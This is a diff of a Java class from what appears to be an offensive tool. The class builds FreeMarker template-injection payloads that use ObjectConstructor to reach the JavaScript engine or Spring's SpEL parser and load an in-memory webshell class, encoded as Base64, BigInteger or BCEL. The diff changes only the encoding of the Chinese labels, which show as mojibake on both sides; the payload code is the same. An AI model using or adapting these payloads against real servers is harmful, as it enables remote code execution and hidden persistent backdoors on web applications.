@@ -47,17 +47,17 @@ public class FreeMarkerExpr implements IExpr {
     public String[] genMemShell(byte[] memShellClass) {
         try {
             return new String[]{
-                    "[+] JS-Unsafe·½°¸£º==>" + System.lineSeparator() + out("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"javax.script.ScriptEngineManager\").getEngineByName(\"js\").eval(\"" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BASE64) + "\")}") + System.lineSeparator() + " <==",
-                    "[+] JS-BASE64·½°¸£º==>" + System.lineSeparator() + out("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"javax.script.ScriptEngineManager\").getEngineByName(\"js\").eval(\"" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BASE64) + "\")}") + System.lineSeparator() + " <==",
-                    "[+] JS-BigInteger·½°¸£º==>" + System.lineSeparator() + out("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"javax.script.ScriptEngineManager\").getEngineByName(\"js\").eval(\"" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BIGINTEGER) + "\")}") + System.lineSeparator() + " <==",
-                    "[+] JS-BCEL·½°¸£º==>" + System.lineSeparator() + out("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"javax.script.ScriptEngineManager\").getEngineByName(\"js\").eval(\"" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BCEL) + "\")}") + System.lineSeparator() + " <==",
-                    "[+] ÒÔÏÂ·½°¸Ðè¾ßÓÐspring-expression(SpEL)ÒÀÀµ",
-                    "[+] Spring·´Éä×é¼þ·½°¸£º==>" + System.lineSeparator() + out("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"org.springframework.expression.spel.standard.SpelExpressionParser\").parseExpression(\"" + SpELMemShellFactory.genSpringMemShell1(memShellClass) + "\").getValue()}") + System.lineSeparator() + " <==",
-                    "[+] BCEL·½°¸£º==>" + System.lineSeparator() + out("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"org.springframework.expression.spel.standard.SpelExpressionParser\").parseExpression(\"" + SpELMemShellFactory.genSpringMemShell2(memShellClass) + "\").getValue()}") + System.lineSeparator() + " <=="
+                    "[+] JS-Unsafeæ–¹æ¡ˆï¼š==>" + System.lineSeparator() + out("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"javax.script.ScriptEngineManager\").getEngineByName(\"js\").eval(\"" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BASE64) + "\")}") + System.lineSeparator() + " <==",
+                    "[+] JS-BASE64æ–¹æ¡ˆï¼š==>" + System.lineSeparator() + out("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"javax.script.ScriptEngineManager\").getEngineByName(\"js\").eval(\"" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BASE64) + "\")}") + System.lineSeparator() + " <==",
+                    "[+] JS-BigIntegeræ–¹æ¡ˆï¼š==>" + System.lineSeparator() + out("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"javax.script.ScriptEngineManager\").getEngineByName(\"js\").eval(\"" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BIGINTEGER) + "\")}") + System.lineSeparator() + " <==",
+                    "[+] JS-BCELæ–¹æ¡ˆï¼š==>" + System.lineSeparator() + out("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"javax.script.ScriptEngineManager\").getEngineByName(\"js\").eval(\"" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BCEL) + "\")}") + System.lineSeparator() + " <==",
+                    "[+] ä»¥ä¸‹æ–¹æ¡ˆéœ€å…·æœ‰spring-expression(SpEL)ä¾èµ–",
+                    "[+] Springåå°„ç»„ä»¶æ–¹æ¡ˆï¼š==>" + System.lineSeparator() + out("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"org.springframework.expression.spel.standard.SpelExpressionParser\").parseExpression(\"" + SpELMemShellFactory.genSpringMemShell1(memShellClass) + "\").getValue()}") + System.lineSeparator() + " <==",
+                    "[+] BCELæ–¹æ¡ˆï¼š==>" + System.lineSeparator() + out("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"org.springframework.expression.spel.standard.SpelExpressionParser\").parseExpression(\"" + SpELMemShellFactory.genSpringMemShell2(memShellClass) + "\").getValue()}") + System.lineSeparator() + " <=="
             };
         } catch (Exception ex) {
             return new String[]{
-                    "classÎÄ¼þÒì³£",
+                    "classæ–‡ä»¶å¼‚å¸¸",
                     Utils.getErrDetail(ex)
             };
         }
